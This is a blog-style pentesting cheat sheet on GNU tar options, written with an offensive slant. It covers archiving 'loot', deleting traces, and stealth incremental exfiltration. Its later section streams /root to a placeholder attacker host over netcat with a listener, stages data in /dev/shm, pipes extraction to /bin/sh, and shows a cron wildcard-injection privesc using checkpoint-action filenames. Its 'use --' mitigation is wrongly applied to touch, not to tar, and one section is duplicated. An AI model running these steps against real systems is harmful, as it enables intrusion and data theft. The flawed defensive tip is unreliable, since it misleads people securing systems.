---
title: tar
date: 2026-02-12 12:00:00 +0800
categories: linux
toc: true
media_subpath: /assets/media/
image: tar-2.png
tags: [linux, utilities, command, ]
pin: false
math: true
mermaid: true
comments: true
---


### Tar command: Useful usage flags with their exlanation and use cases.

This guide will walk you through different options, flags and where you might need them in active engagement.

### **Basic Commands**
####  **Creates a new archive**
   ```bash
   tar -cvf backup.tar /path/to/directory
   ``` 
    - c â†’ create
    - v â†’ verbose
    - f â†’ filename  

    **What it does?**  
    Recursively archives files/directories.
   #####  **Handling Corrupt Files**
    ```bash
    tar -cvf backup.tar /root --ignore-failed-read
    ```
   ##### **Verify Archive Integrity**
    ```bash
    tar -cvf backup.tar /etc -W
    ```
    - Exfiltrating large datasets

    - Ensuring archive not corrupted

   ##### **Deleting Original Files After Archiving**
    ```bash
    tar -cvf loot.tar /tmp/loot --remove-files
    ```
    - Clean artifacts after staging
    - Remove sensitive traces

   ##### **Preserves Absolute Path**
    ```bash
    tar -P -cf archive.tar /etc/passwd
    ```
    - Tar removes leading / by default as it;
      - Prevent overwriting arbitrary system files on extraction  
      - Avoid archive extraction attacks
      - Safer default behavior

   **Pentesting Use Cases:**  
    * Data exfiltration staging
    * Bundling loot
    * Archiving sensitive directories before transfer 

ðŸ’¡ On compromised systems, tar is almost always installed â€” reliable for staging data. 

***

#### **Extract an archive**
   ```bash
   tar -xvf backup.tar
   ``` 
    - x â†’ extract
    - v â†’ verbose
    - f â†’ filename  

    **What it does?**  
    Extract archive contents. 

   ##### **Keep old files**
    ```bash
    tar -xvf archive.tar -k
    ```
    - Avoid damaging system

  ##### **Do not overwrite if target is newer**
    ```bash
    tar -xvf archive.tar --keep-newer-files
    ```

  ##### **Change Extraction Path**
    ```bash
    tar -xvf archive.tar -C /tmp
    ```

  ##### **Unlink(Delete) befor extraction**
    ```bash
    tar -xUf archive.tar
    ```
    - Deletes (unlinks) the existing file first.
    - For each file:
      - If file exists â†’ remove it completely
      - Then create fresh file
    - Normal Tar behavior:
      - Tar opens it
      - Overwrites contents
      - But file metadata may remain

    **Pentesting Use Cases:**  
    * Deploying uploaded tools  
    * Unpacking privesc scripts  
    * Extracting backups found on system
      
    ðŸ’¡ Extracting untrusted archives can be dangerous (path traversal risk).  
    
***

3. #### **List Archive Content**
   ```bash
   tar -tvf backup.tar
   ``` 
    - t â†’ view
    - v â†’ verbose
    - f â†’ filename  

    **What it does?**  
    View archive contents without extracting.  

    **Pentesting Use Cases:**  
    * Before extracting unknown archive:

    ```bash
    tar -tf suspicious.tar
    ```    
    * Prevents accidental file overwrite  
    * Detects malicious archive entries like:

    ```bash
    ../../etc/passwd
    ```
***
#### **--one-top-level**  
  ```bash
  tar -xvf archive.tar --one-top-level=name(optional)
  ```
  **What it does?**  
        Creates a new directory and extracts all files inside it. Prevents path traversal attacks.  

  **Pentesting Use Cases:**  
        * Safe handling of untrusted archives  
        * Secure DevOps extraction

  ***
  
  #### **Append Files**
   ```bash
    tar -rf backup.tar newfile.txt
   ```
  **What it does?**  
    Add files to end of archive.  

    âš ï¸ Cannot be used on compressed archives.   

  **Pentesting Use Cases:**  
    * Add new loot incrementally without rebuilding archive.
      
  ***
  
#### **Update (Append only if newer)**
  ```bash
  tar -uvf backup.tar file.txt
  ```
  **What it does?**  
    Versioned archiving:
    Adds file only if newer than archived version.  
    It DOES NOT replace old copy â€” it appends a new version.  
    Archive may contain multiple versions.

    âš ï¸ Cannot be used on compressed archives.

  **To extract a specific version file from archive**  
  ```ini
  tar -xvf backup.tar --occurrence=2 file.txt
  ```
  **Pentesting Use Cases:**  
    * Incremental backups during long engagement  
    * Preserving timeline of file changes
      
***
#### **Compare Archive to Filesystem**
   ```bash
    tar -dvf archive.tar
   ```
  **What it does?**  
     * Compare archive with current filesystem.
     * Detect modified files.

    âš ï¸ Cannot be used on compressed archives.   

  **Pentesting Use Cases:**  
    * Forensic analysis
    * Detect file tampering

    ðŸ’¡ Useful during post-exploitation cleanup.
   
***
  
#### **Delete From Archive**
   ```bash
    tar --delete -f archive.tar file.txt
   ```
   **What it does?**  
     * Remove file from archive.

    âš ï¸ Cannot be used on compressed archives.   

====================================================================
###  ***Advanced Commands***
#### **Incremental Backup**
   ```bash
    tar -g snapshot.file -cvf backup.tar /home
   ```
  **What it does?**  
     * Tracks filesystem changes using snapshot file.

    âš ï¸ Cannot be used on compressed archives.   

  **Pentesting Use Cases:**  
    * Stealth data exfiltration
    * Monitoring changed files  
    
  **Usage**  
    `snapshot.file` stores metadata about:

    * inode numbers

    * timestamps

    * device numbers

    * file state
    ```bash
    tar -g snapshot.file -cvf backup2.tar /home
    ```
    Now tar compares:

    * Current filesystem

    * Data inside snapshot.file

    And only archives:

    Modified files and Newly created files

    ðŸ”¥ This makes backup2.tar much smaller.  

  **Restore**  
    You must extract in order:
    ```bash
    mkdir restore
    cd restore

    tar -xvf backup.tar
    tar -xvf backup2.tar -g /dev/null
    ```


 ##### **Why /dev/null?**  
    `During creation`  
    The snapshot file is actively used.  
    `During extraction`  
    The snapshot file is NOT used.  
    But tarâ€™s syntax requires that if archive was created with -g, you must also supply -g when extracting.
    Itâ€™s a syntactic requirement, not a functional one.

 ##### ðŸ§© **Why Tar Requires -g at Extraction**

    GNU tar stores special incremental metadata inside the archive:

    - Directory state

    - Deletion records

    - Dump level markers

    When extracting incremental archives, tar switches into incremental restore mode only if -g is specified.

    If you don't use -g, tar may:

    - Ignore deletion markers

    - Not properly restore directory metadata

    - Behave differently with incremental archives

    So -g tells tar:

    â€œThis archive is incremental. Process it accordingly.â€  
  ##### ðŸ§  **Why /dev/null Specifically?**  
    During extraction:  
    Tar needs a filename after -g
    But it does NOT actually read the snapshot file
    It only checks that one is supplied
    So we give it:
    ```bash
    /dev/null
    ```
    Because:
    It exists
    Itâ€™s harmless
    It contains nothing
    It discards any write attempts

 ##### **Want to force a new full backup**  
    ```bash
    tar -g snapshot.file --level=0 -cvf full.tar /home
    ```
    - this truncates snapshot file

  ***
#### **Sparse Files**
   ```bash
    tar -S -cvf db.tar database.img
   ```
   **What it does?**  
  * Efficiently archives sparse files.  
  * Huge files with empty blocks.  
  -  Example:  
    - VM disk images  
    - Database files 

  **Pentesting Use Cases:**  
  * Archiving VM images found on system
  * Dumping database files efficiently
***
#### **Sparse Files**
   ```bash
    tar -S -cvf db.tar database.img
   ```
   **What it does?**  
  * Efficiently archives sparse files.  
  * Huge files with empty blocks.  
  -  Example:  
    - VM disk images  
    - Database files 

  **Pentesting Use Cases:**  
  * Archiving VM images found on system
  * Dumping database files efficiently
***
### **GTFO, LoL & PrivSec**

#### **--to-command**
   ```bash
   tar -xf archive.tar --to-command=/bin/sh
   ```
   - Tar will:
      - Extract each file
      - Pipe its contents to /bin/sh
     But /bin/sh expects commands, not file data.
    ```bash
    tar -xf archive.tar --to-command='sh -c "echo pwned"'
    ```
      or
    ```bash
    tar -xf archive.tar --to-command='cat > /tmp/output'
    ```
***
#### **Pure in-memory streaming exfiltration**
    ```bash
    tar -czf - /root | nc attacker_ip 4444
    ```
    - c â†’ create archive
    - z â†’ gzip compress
    - f - â†’ write to stdout (NOT a file)
    | â†’ pipe
    nc â†’ send data over network

    Tar never writes to disk.
    It streams directly to netcat.

##### Attacker Side
    ```bash
    nc -lvnp 4444 > received.tgz
    ```
    - l â†’ listen
    - v â†’ verbose
    - n â†’ no DNS
    - p 4444 â†’ port 4444
    > received.tar.gz â†’ save incoming data

###### Stream and auto-extract on receiver
    ```bash
    nc -lvnp 4444 | tar -xzf -
    ```

###### Replace nc with ssh(more advanced)
    ```bash
    tar -czf - ~/labdata | ssh user@remote 'cat > loot.tar.gz'
    ```

##### Victim Side
    ```bash
    tar -czf - ~/labdata | nc 127.0.0.1 4444
    ```
    - 127.0.0.1 = local machine  
    - No file created on disk  
    - Archive streamed through memory
***
#### **In-memory Staging through `/dev/shm`**
    `/dev/shm` is:
    - A tmpfs filesystem
    - Backed by RAM
    - Not written to disk
    - Cleared on reboot
    ```bash
    tar -czf /dev/shm/cache.tgz /directory
    ```
    > `Staging` = preparing data before exfiltration.  

    > In-memory staging = storing that staged data in RAM instead of disk.
***
#### Wildcard Injection Privesc
    You can create malicious filenames(in same dir):  
    ```bash
    touch "--checkpoint=1"
    touch "--checkpoint-action=exec=sh shell.sh"
    ```
    If a cron job runs:  
    ```bash
    tar -cf backup.tar *
    ```  
    Shell expands to:  
    ```bash
    tar -cf backup.tar file1.txt file2.txt --checkpoint=1 --checkpoint-action=exec=sh shell.sh
    ```
    as tar interprets these as options:
    ```bash
    --checkpoint=1  #Trigger a checkpoint every 1 record.
    --checkpoint-action=exec=sh shell.sh  #At checkpoint, execute this command.
    ```
    ðŸ’¡  Use `--` to stop option parsing:
    ```bash
    touch -- "--checkpoint=1"
    touch -- "--checkpoint-action=exec=sh shell.sh"
    ```




find / -name "*.tar*" 2>/dev/null
